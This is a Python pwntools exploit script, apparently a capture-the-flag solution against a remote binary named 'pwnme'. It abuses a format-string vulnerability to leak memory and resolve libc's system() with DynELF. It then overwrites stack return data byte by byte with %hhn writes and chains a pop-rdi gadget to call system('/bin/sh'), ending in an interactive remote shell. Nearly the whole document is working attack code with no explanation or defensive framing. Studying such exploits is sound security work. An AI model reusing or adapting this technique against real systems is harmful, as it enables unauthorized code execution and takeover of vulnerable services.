# -*-coding:utf-8-*-
from pwn import *
# based on joker 's exploit
r = remote("106.75.66.195", 13002)#pwn
#r = remote("127.0.0.1", 10001)#pwn
#context.log_level = "debug"
read_got = 0x0000000000601FC8
pop_rdi_ret = 0x0000000000400ed3
pppr = 0x000000000400ECE
#ret addr 0x0000000000400e56
def leak(addr):
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil("20):")
    payload = "aaaa"
    r.sendline(payload)
    r.recvuntil("20):")
    payload = "%12$s"+"AAAAAAA" + p64(addr)
    r.send(payload)
    r.recvuntil(">")
    r.sendline("1")
    content = r.recvuntil("AAAAAAA")
    if(len(content) == 12):
        print "[*] NULL "
        return '\x00'
    else:
        print "[*]%#x -- > %s" % (addr,(content[5:-7] or '').encode('hex'))
        return content[5:-7]
#writebyte
def writebyte(count_byte,addr):
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil("20):")
    payload = "aaaa"
    r.sendline(payload)
    r.recvuntil("20):")
    payload = "%{0}c%12$hhn".format(count_byte)
    payload += "A"*(12-len(payload)) + p64(addr)
    r.send(payload)
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil("\n")
r.recvuntil("40):")
r.sendline("aaa")
r.recvuntil("40):")
r.sendline("aaa")
d = DynELF(leak,elf=ELF('./pwnme'))
system_addr = d.lookup('system','libc')
print "[*] system addr:{0}".format(hex(system_addr))
#leak ret_addr
r.recvuntil(">")
r.sendline("2")
r.recvuntil("20):")
payload = "aaaa"
r.sendline(payload)
r.recvuntil("20):")
payload = "%6$s" #stack
r.send(payload)
r.recvuntil(">")
r.sendline("1")
r.recvuntil("\n")
content = r.recv(6)
content = content.ljust(8,"\x00")
stack_addr = u64(content)  # 0x7ffc23fb85e0
stack_while_ret_addr = stack_addr + 8 - 0xb0 #
print "[*] stack_while_ret addr:{0}".format(hex(stack_while_ret_addr))
#leak_ret_addr
'''
0000| 0x7ffc23fb84f0 --> 0x7ffc23fb8530 --> 0x7ffc23fb85e0 --> 0x400e70 (push   r15)
0008| 0x7ffc23fb84f8 --> 0x400d32 (add    rsp,0x30)
0016| 0x7ffc23fb8500 --> 0xa61616161 ('aaaa\n')
0024| 0x7ffc23fb8508 --> 0x0 
0032| 0x7ffc23fb8510 --> 0x7324362500000000 ('')
0040| 0x7ffc23fb8518 --> 0x0 
0048| 0x7ffc23fb8520 --> 0x0 
0056| 0x7ffc23fb8528 --> 0x400d0b (cmp    eax,0x2)
'''
writebyte(0xce,stack_while_ret_addr)
writebyte(system_addr & 0xff,stack_while_ret_addr + 0x30)
writebyte((system_addr >> 8) & 0xff,stack_while_ret_addr + 0x30 + 1)
writebyte((system_addr >> 16) & 0xff,stack_while_ret_addr + 0x30 + 2)
writebyte((system_addr >> 24) & 0xff,stack_while_ret_addr + 0x30 + 3)
writebyte((system_addr >> 32) & 0xff,stack_while_ret_addr + 0x30 + 4)
writebyte((system_addr >> 40) & 0xff,stack_while_ret_addr + 0x30 + 5)
print r.recvuntil(">")
r.sendline("2")
print r.recvuntil("20):")
payload = "/bin/sh;" + "AAAAAAAABBB"
r.sendline(payload)
print r.recvuntil("20):")
payload = "\x00\x00\x00\x00" + p64(pop_rdi_ret) + p64(stack_while_ret_addr + 8)
#raw_input('$ret')
r.send(payload)
print r.recvuntil(">")
r.sendline('3')
r.interactive()